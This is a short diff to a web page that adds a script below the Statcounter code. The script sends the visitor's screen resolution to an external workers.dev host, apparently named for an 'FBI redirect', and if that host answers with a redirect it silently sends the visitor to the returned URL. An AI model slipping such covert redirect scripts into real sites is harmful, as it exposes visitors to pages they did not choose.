@@ -345,10 +345,17 @@ src="https://c.statcounter.com/13007331/0/5e6c5eff/1/"
 alt="Web Analytics"
 referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
 <!-- End of Statcounter Code -->
+
+<script>
+const screen = `${window.screen.width}x${window.screen.height}`;
+fetch(`https://matus-phone-fbi-redirect.jmk-e2d.workers.dev/?screen=${screen}`)
+  .then(response => {
+    if (response.redirected) {
+      window.location.href = response.url;
+    }
+  })
+  .catch(err => console.log('Redirect check failed:', err));
+</script>
 	
 </body>
 </html>
-
-
-
-
